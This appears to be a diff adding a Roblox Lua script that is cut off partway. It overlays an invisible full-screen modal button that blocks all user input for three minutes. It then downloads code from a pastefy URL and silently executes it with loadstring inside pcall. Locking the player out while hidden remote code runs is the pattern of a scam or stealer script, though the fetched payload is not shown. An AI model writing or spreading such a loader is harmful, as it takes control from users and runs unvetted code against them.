@@ -1,0 +1,29 @@
+--// Block User Input for X Seconds
+local function blockUserInput(duration)
+    local inputBlocker = Instance.new("ScreenGui", game:GetService("CoreGui"))
+    inputBlocker.Name = "InputBlocker"
+    inputBlocker.IgnoreGuiInset = true
+    inputBlocker.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+    local blockFrame = Instance.new("TextButton", inputBlocker)
+    blockFrame.Size = UDim2.new(1, 0, 1, 0)
+    blockFrame.Position = UDim2.new(0, 0, 0, 0)
+    blockFrame.BackgroundTransparency = 1
+    blockFrame.Text = ""
+    blockFrame.AutoButtonColor = false
+    blockFrame.Modal = true
+
+    task.delay(duration, function()
+        inputBlocker:Destroy()
+    end)
+end
+
+--// Optional: Block input for 3 minutes (can remove if not needed)
+blockUserInput(180)
+
+--// Load your scripts directly
+pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/xKmrqJB5/raw"))()
+end)
+
+pcall(function()
